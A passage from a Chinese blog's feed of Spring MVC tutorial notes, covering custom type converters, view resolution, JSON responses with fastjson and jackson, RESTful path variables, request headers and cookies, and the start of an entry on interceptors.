<h2 id="2-自定义类型转换器"><a href="#2-自定义类型转换器" class="headerlink" title="2. 自定义类型转换器"></a>2. 自定义类型转换器</h2><blockquote>
<p><strong>自定义类型转换器步骤：</strong><br>① 定义转换器类实现Converter接口<br>② 声明引用转换器</p>
</blockquote>
<p><strong>① 定义转换器类实现Converter接口</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tyt.convert;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateConverter</span> <span class="keyword">implements</span> <span class="title class_">Converter</span>&lt;String, Date&gt; &#123;</span><br><span class="line">	<span class="keyword">public</span> Date <span class="title function_">convert</span><span class="params">(String source)</span> &#123;</span><br><span class="line">		<span class="comment">// 将日期字符串转换成日期对象并返回</span></span><br><span class="line">		<span class="type">SimpleDateFormat</span> <span class="variable">simpleDateFormat</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormat</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>);</span><br><span class="line">		<span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			date = simpleDateFormat.parse(source);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (ParseException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> date;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>&#x3D;&#x3D;<strong>若Spring基于xml配置</strong>&#x3D;&#x3D;<br><strong>② 在配置文件中声明并引用转换器</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    声明转换器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;myConvert&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.context.support.ConversionServiceFactoryBean&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;converters&quot;</span> &gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;com.tyt.convert.DateConverter&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--    引用转换器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span> <span class="attr">conversion-service</span>=<span class="string">&quot;myConvert&quot;</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<hr>
<p>&#x3D;&#x3D;<strong>若Spring基于注解开发</strong>&#x3D;&#x3D;<br><strong>② 定义类，注册转换器</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ControllerAdvice</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DateConvertRegister</span> &#123;</span><br><span class="line">	</span><br><span class="line">	<span class="meta">@Autowired</span></span><br><span class="line">	<span class="keyword">private</span> DateConverter dateConverter;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@InitBinder</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dateBinder</span><span class="params">(WebDataBinder dataBinder)</span>&#123;</span><br><span class="line">		<span class="comment">//1.获取转换服务对象</span></span><br><span class="line">		<span class="type">ConversionService</span> <span class="variable">conversionService</span> <span class="operator">=</span> dataBinder.getConversionService();</span><br><span class="line">		<span class="comment">//2.判断conversionService是否为GenericConversionService类型</span></span><br><span class="line">		<span class="keyword">if</span>(conversionService <span class="keyword">instanceof</span> GenericConversionService)&#123;</span><br><span class="line">			<span class="comment">//3.强转</span></span><br><span class="line">			<span class="type">GenericConversionService</span> <span class="variable">genericConversionService</span> <span class="operator">=</span> (GenericConversionService)conversionService;</span><br><span class="line">			<span class="comment">//4.添加类型转换器</span></span><br><span class="line">			genericConversionService.addConverter(dateConverter);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="四、SpringMVC的数据响应"><a href="#四、SpringMVC的数据响应" class="headerlink" title="四、SpringMVC的数据响应"></a>四、SpringMVC的数据响应</h1><blockquote>
<p><strong>响应方式分为两种方式：</strong></p>
<ul>
<li><strong>页面跳转</strong><br>① 直接返回字符串<br>② 通过<code>ModelAndView</code>对象返回</li>
<li><strong>回显数据</strong><br>① 直接返回字符串<br>② 返回对象或集合</li>
</ul>
</blockquote>
<h2 id="1-页面跳转"><a href="#1-页面跳转" class="headerlink" title="1. 页面跳转"></a>1. 页面跳转</h2><h3 id="1-页面跳转-返回字符串形式"><a href="#1-页面跳转-返回字符串形式" class="headerlink" title="1. 页面跳转-返回字符串形式"></a>1. 页面跳转-返回字符串形式</h3><p>直接返回字符串：此种方式会将返回的字符串与<code>视图解析器</code>的前后缀拼接后跳转。</p>
<p>&#x3D;&#x3D;<strong>若基于xml配置</strong>&#x3D;&#x3D;</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--    配置内部资源视图解析器--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;viewResolver&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;prefix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;/WEB-INF/views/&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;suffix&quot;</span> <span class="attr">value</span>=<span class="string">&quot;.jsp&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>&#x3D;&#x3D;<strong>若基于注解开发</strong>&#x3D;&#x3D;</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@ComponentScan(&quot;com.tyt.controller&quot;)</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span> <span class="comment">// 根据类型匹配对应的类型转换器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SpringMvcConfig</span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/**</span></span><br><span class="line"><span class="comment">	* 视图解析器</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	<span class="meta">@Bean(name=&quot;tnternalResourceViewResolver&quot;)</span></span><br><span class="line">	<span class="keyword">public</span> ViewResolver <span class="title function_">initViewResolver</span><span class="params">()</span>&#123;</span><br><span class="line">		<span class="type">InternalResourceViewResolver</span> <span class="variable">viewResolver</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InternalResourceViewResolver</span>();</span><br><span class="line">		viewResolver.setPrefix(<span class="string">&quot;/WEB-INF/jsp/&quot;</span>);</span><br><span class="line">		viewResolver.setSuffix(<span class="string">&quot;.jsp&quot;</span>); </span><br><span class="line">		<span class="keyword">return</span> viewResolver;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<hr>
<h3 id="2-页面跳转-返回ModelAndView形式"><a href="#2-页面跳转-返回ModelAndView形式" class="headerlink" title="2. 页面跳转-返回ModelAndView形式"></a>2. 页面跳转-返回ModelAndView形式</h3><p><strong>index.jsp代码：</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello World!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>$&#123;username&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>① 设置视图、模型</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设置当前操作访问路径</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;/test&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	* model：模型，封装数据</span></span><br><span class="line"><span class="comment">	* view：视图，展示数据</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">	System.out.println(<span class="string">&quot;返回 modelAndView...&quot;</span>);</span><br><span class="line">	<span class="type">ModelAndView</span> <span class="variable">modelAndView</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ModelAndView</span>();</span><br><span class="line">	<span class="comment">// 设置视图名称</span></span><br><span class="line">	modelAndView.setViewName(<span class="string">&quot;index&quot;</span>);</span><br><span class="line">	<span class="comment">// 设置模型数据</span></span><br><span class="line">	modelAndView.addObject(<span class="string">&quot;username&quot;</span>, <span class="string">&quot;tyt&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<hr>
<blockquote>
<p><strong>② 在Controller中方法形参上直接声明ModelAndView，无需在方法中自己创建，在方法中直接使用该对象设置 视图，同样可以跳转页面</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test2&quot;)</span></span><br><span class="line"><span class="keyword">public</span> ModelAndView <span class="title function_">test2</span><span class="params">(ModelAndView modelAndView)</span>&#123;</span><br><span class="line">	modelAndView.addObject(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;tyt&quot;</span>);</span><br><span class="line">	modelAndView.setViewName(<span class="string">&quot;index&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> modelAndView;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>SpringMVC对方法的参数可以进行相应的注入，当解析该方法时发现需要一个<code>ModelAndView</code> 那么SpringMVC就会提供一个ModelAndView。</p>
<hr>
<blockquote>
<p><strong>③ 只设置模型model ，返回字符串</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test3&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test3</span><span class="params">(Model model)</span>&#123;</span><br><span class="line">	<span class="comment">// 设置模型</span></span><br><span class="line">	model.addAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;tyt&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回逻辑视图名称</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<blockquote>
<p><strong>④ 在Controller方法的形参上可以直接使用原生的HttpServeltRequest对象，只需声明即可</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test4&quot;)</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test4</span><span class="params">(HttpServletRequest request)</span>&#123;</span><br><span class="line">	request.setAttribute(<span class="string">&quot;username&quot;</span>,<span class="string">&quot;tyt&quot;</span>);</span><br><span class="line">	<span class="comment">// 返回逻辑视图名称</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;index&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="2-回显数据"><a href="#2-回显数据" class="headerlink" title="2. 回显数据"></a>2. 回显数据</h2><h3 id="1-回显数据-直接返回字符串"><a href="#1-回显数据-直接返回字符串" class="headerlink" title="1. 回显数据-直接返回字符串"></a>1. 回显数据-直接返回字符串</h3><blockquote>
<ul>
<li>通过SpringMVC框架注入的response对象，使用<code>response.getWriter().print(&quot;&quot;)</code> 回写数据，此时不需要视图跳转，业务方法返回值为void</li>
<li>将需要回写的字符串直接返回，但此时需要通过<code>@ResponseBody</code>注解告知SpringMVC框架，方法返回的字符串不是跳转是直接在http响应体中返回</li>
</ul>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test5&quot;)</span></span><br><span class="line"><span class="comment">// 设置当前操作返回值类型</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">test5</span><span class="params">(HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">	response.getWriter().println(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/test6&quot;)</span></span><br><span class="line"><span class="comment">// 使用该注解 告知SpringMVC返回的字符串直接在响应体返回</span></span><br><span class="line"><span class="meta">@ResponseBody</span> </span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test6</span><span class="params">()</span> &#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="2-回显数据-回显json数据"><a href="#2-回显数据-回显json数据" class="headerlink" title="2. 回显数据-回显json数据"></a>2. 回显数据-回显json数据</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/test7&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">test7</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="comment">// 引号需要进行转义</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;username\&quot;:\&quot;tyt\&quot;,\&quot;age\&quot;:20&#125;&quot;</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>手动拼接json格式字符串的方式很麻烦，开发中往往要将复杂的Java对象转换成json格式的字符串，我们可以使用json转换工具<code>fastjson</code>进行转换。<br><strong>导入fastjson相关坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.62<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// produces=&quot;text/html;charset=utf-8&quot; 解决返回中文乱码问题</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/test8&quot;,produces=&quot;text/html;charset=utf-8&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> String  <span class="title function_">test8</span><span class="params">(HttpServletResponse response)</span>&#123;</span><br><span class="line">	<span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;tyt&quot;</span>, <span class="number">20</span>, <span class="string">&quot;男&quot;</span>);</span><br><span class="line">	<span class="comment">// 将对象转换为 JSON 字符串</span></span><br><span class="line">	<span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">	<span class="comment">// 将 JSON 字符串转换为对象</span></span><br><span class="line">	<span class="type">User</span> <span class="variable">user1</span> <span class="operator">=</span> JSON.parseObject(json, User.class);</span><br><span class="line">	<span class="keyword">return</span> json;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<hr>
<h3 id="3-回显数据-返回对象或集合"><a href="#3-回显数据-返回对象或集合" class="headerlink" title="3. 回显数据-返回对象或集合"></a>3. 回显数据-返回对象或集合</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(value = &quot;/test9&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> User  <span class="title function_">test9</span><span class="params">(HttpServletResponse response)</span>&#123;</span><br><span class="line">	<span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;tyt&quot;</span>, <span class="number">20</span>, <span class="string">&quot;男&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> user;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>通过SpringMVC帮助我们对对象或集合进行json字符串的转换并回写，为处理器适配器配置消息转换参数，指定使用jackson进行对象或集合的转换，因此需要做出以下配置：<br><strong>① 导入 jackson 坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>2.12.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>② 有三种方法：</strong></p>
<ul>
<li><strong>方法一：在spring-mvc.xml文件中配置处理器适配器</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  配置处理器适配器  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;messageConverters&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.http.converter.json.MappingJackson2HttpMessageConverter&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><strong>方法二：在spring-mvc.xml文件中配置SpringMVC的注解驱动</strong></li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--  配置SpringMVC的注解驱动  --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">mvc:annotation-driven</span> /&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>前提是要引入mvc的命名空间和约束路径</strong><br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<ul>
<li><strong>方法三：直接在UserController加上 <code>@EnableWebMvc</code>注解</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@EnableWebMvc</span> <span class="comment">// 根据类型匹配对应的类型转换器</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserController</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@RequestMapping(value = &quot;/test9&quot;)</span></span><br><span class="line">	<span class="meta">@ResponseBody</span></span><br><span class="line">	<span class="keyword">public</span> User  <span class="title function_">test9</span><span class="params">(HttpServletResponse response)</span>&#123;</span><br><span class="line">		<span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;tyt&quot;</span>, <span class="number">20</span>, <span class="string">&quot;男&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> user;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<hr>
<h1 id="五、RESTful风格参数的获取"><a href="#五、RESTful风格参数的获取" class="headerlink" title="五、RESTful风格参数的获取"></a>五、RESTful风格参数的获取</h1><blockquote>
<p><code>Restful</code>是一种软件<code>架构风格、设计风格</code>，而不是标准，只是提供了一组设计原则和约束条件。主要用于客户端和服务器交互类的软件，基于这个风格设计的软件可以更简洁，更有层次，更易于实现缓存机制等。<br><br><br>Restful风格的请求是使用<code>“url+请求方式”</code>表示一次请求目的，HTTP 协议里面四个表示操作方式的动词如下：</p>
<ul>
<li>GET：用于获取资源</li>
<li>POST：用于新建资源</li>
<li>PUT：用于更新资源</li>
<li>DELETE：用于删除资源</li>
</ul>
<hr>
<ul>
<li><strong>传统风格资源描述形式</strong><br> <a href="http://localhost/user/getById?id=1">http://localhost/user/getById?id=1</a><br> <a href="http://localhost/user/saveUser">http://localhost/user/saveUser</a></li>
<li><strong>REST风格描述形式</strong><br>  <a href="http://localhost/user/1">http://localhost/user/1</a><br><a href="http://localhost/user">http://localhost/user</a></li>
</ul>
</blockquote>
<ul>
<li><strong>优点：</strong><br>① 隐藏资源的访问行为，无法通过地址得知对资源是何种操作<br>② 书写简化</li>
</ul>
<hr>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154646.png"></p>
<p><strong>REST风格描述模块的名称通常使用复数，也就是加<code>s</code>的格式描述，表示此类资源，而非单个资源，例如：books、users……</strong></p>
<hr>
<h2 id="1-PathVariable映射占位符"><a href="#1-PathVariable映射占位符" class="headerlink" title="1. @PathVariable映射占位符"></a>1. @PathVariable映射占位符</h2><p>上述url地址 <code>http://localhost/user/1</code>中的<code>1</code>就是要获得的请求参数，在SpringMVC中可以使用<code>占位符</code>进行参数绑定。地 址<code>/user/1</code>可以写成<code>/user/&#123;id&#125;</code>，占位符{id}对应的就是1的值。在业务方法中我们可以使用<code>@PathVariable</code>注解进行占位符的匹配获取工作。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t9/&#123;id&#125;&quot;)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test9</span><span class="params">(<span class="meta">@PathVariable(value = &quot;id&quot;)</span> Integer id)</span>&#123;</span><br><span class="line">	System.out.println(<span class="string">&quot;id = &quot;</span> +id);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<hr>
<h1 id="六、获得Servlet相关API"><a href="#六、获得Servlet相关API" class="headerlink" title="六、获得Servlet相关API"></a>六、获得Servlet相关API</h1><p>SpringMVC支持使用原始ServletAPI对象作为控制器方法的参数进行注入，常用的对象如下：</p>
<ul>
<li><code>HttpServletRequest</code></li>
<li><code>HttpServletResponse</code></li>
<li><code>HttpSession</code></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t10&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test10</span><span class="params">(HttpServletRequest request, HttpServletResponse response, HttpSession session)</span>&#123;</span><br><span class="line">	System.out.println(request);</span><br><span class="line">	System.out.println(response);</span><br><span class="line">	System.out.println(session);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="七、获得请求头消息"><a href="#七、获得请求头消息" class="headerlink" title="七、获得请求头消息"></a>七、获得请求头消息</h1><h3 id="1-RequestHeader"><a href="#1-RequestHeader" class="headerlink" title="1. @RequestHeader"></a>1. @RequestHeader</h3><p>使用<code>@RequestHeader</code>可以获得请求头信息，相当于JavaWebz中的的<code>request.getHeader(name)</code>。<br><strong>@RequestHeader注解的属性如下：</strong></p>
<ul>
<li><code>value</code>：请求头的名称</li>
<li><code>required</code>：是否必须携带此请求头</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t10&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test10</span><span class="params">(<span class="meta">@RequestHeader(value = &quot;User-Agent&quot;,required = false)</span> String userAgent)</span>&#123;</span><br><span class="line">	System.out.println(userAgent);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-CookieValue"><a href="#2-CookieValue" class="headerlink" title="2. @CookieValue"></a>2. @CookieValue</h3><p> 使用<code>@CookieValue</code>可以获得指定Cookie的值。<br><strong>@CookieValue注解的属性如下：</strong></p>
<ul>
<li><code>value</code>：指定cookie的名称</li>
<li><code>required</code>：是否必须携带此cookie</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/t11&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test11</span><span class="params">(<span class="meta">@CookieValue(value = &quot;JSESSIONID&quot;)</span> String jsessionID)</span>&#123;</span><br><span class="line">	System.out.println(jsessionID);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<h1 id="八、-RequestBody、-RequestParam、-PathVariable区别"><a href="#八、-RequestBody、-RequestParam、-PathVariable区别" class="headerlink" title="八、@RequestBody、@RequestParam、@PathVariable区别"></a>八、@RequestBody、@RequestParam、@PathVariable区别</h1><ul>
<li><p>区别<br> @RequestBody用于接受json数据【application&#x2F;json】<br>@RequestParam用于接受url地址传参，表单传参【application&#x2F;x-www-form-urlencoded】<br>@PathVariable用于接受路径参数，映射url绑定的占位符</p>
</li>
<li><p>应用<br> 后期开发中，请求参数超过1个，以json格式数据为主，@RequestBody应用较广<br>如果发送非json格式数据，选用@RequestParam接受请求参数<br>采用RESTful进行开发，当参数数量较少，可以采用@PathVariable接受请求路径变量，通常用于传递id值</p>
</li>
</ul>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>后端</tag>
        <tag>spring</tag>
      </tags>
  </entry>
  <entry>
    <title>SpringMVC拦截器</title>
    <url>/posts/75330943.html</url>
    <content><![CDATA[<h1 id="一、拦截器概念"><a href="#一、拦截器概念" class="headerlink" title="一、拦截器概念"></a>一、拦截器概念</h1><p>在系统中，经常需要在处理用户请求之前和之后执行一些行为，例如检测用户的权限，或者将请求的信息记录到日志中等等，所以需要一种机制，拦截用户的请求，在请求的前后添加处理逻辑。<br>Spring MVC 的拦截器类似于 Servlet 开发中的过滤器 <a href="https://blog.csdn.net/qq_51938362/article/details/125742422?spm=1001.2014.3001.5501">Filter</a>，用于对处理器进行预处理和后处理。<br>将拦截器按一定的顺序联结成一条链，这条链称为拦截器链（InterceptorChain）。在访问被拦截的方法或字段时，拦截器链中的拦截器就会按其之前定义的顺序被调用。拦截器也是<a href="https://blog.csdn.net/qq_51938362/article/details/125822524?csdn_share_tail=%7B%22type%22:%22blog%22,%22rType%22:%22article%22,%22rId%22:%22125822524%22,%22source%22:%22qq_51938362%22%7D&ctrtid=NAerp">AOP</a>思想的具体实现。</p>
<blockquote>
<ul>
<li><strong>拦截器（Interceptor）</strong>：是一种动态拦截方法调用的机制，在SpringMVC中动态拦截控制器方法的执行</li>
<li><strong>作用</strong>：<br>① 在指定的方法调用前后执行预先设定的代码<br>② 阻止原始方法的执行</li>
</ul>
</blockquote>
<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154528.png"></p>
<blockquote>
<p><strong>拦截器与过滤器区别：</strong></p>
<ul>
<li>归属不同：Filter属于Servlet技术，Interceptor属于SpringMVC技术</li>
<li>拦截内容不同：Filter对所有访问进行增强，Interceptor仅针对SpringMVC的访问进行增强<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815154528.png"></li>
</ul>
</blockquote>
<h1 id="二、拦截器开发步骤"><a href="#二、拦截器开发步骤" class="headerlink" title="二、拦截器开发步骤"></a>二、拦截器开发步骤</h1><p><strong>①创建拦截器类实现HandlerInterceptor接口</strong></p>
